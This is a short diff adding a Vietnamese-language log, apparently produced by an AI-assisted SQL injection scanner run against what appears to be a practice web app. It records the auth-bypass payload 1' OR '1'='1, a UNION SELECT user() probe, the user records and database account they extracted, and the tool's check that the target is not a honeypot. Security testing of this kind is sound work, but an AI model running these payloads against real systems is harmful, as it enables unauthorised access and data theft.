@@ -1,0 +1,5 @@
+SQL Injection — AI Self-Validation hoàn tất.
+      - Payload tốt nhất   : 1' OR '1'='1
+      - Mục đích           : Classic OR Auth Bypass
+      - Output trích xuất  : ID: 1' OR '1'='1First name: adminSurname: admin | ID: 1' OR '1'='1First name: GordonSurname: Brown | ID: 1' OR '1'='1First name: HackSurname: Me | ID:
+      - AI Reasoning       : Kết quả từ payload '1' OR '1'='1' và '1' UNION SELECT null, user()#' cho thấy lỗ hổng SQL Injection thực sự tồn tại, vì output chứa thông tin hệ thống như 'admin' và 'app@localhost'. Ngoài ra, các thử nghiệm khác không cho thấy bằng chứng về honeypot.
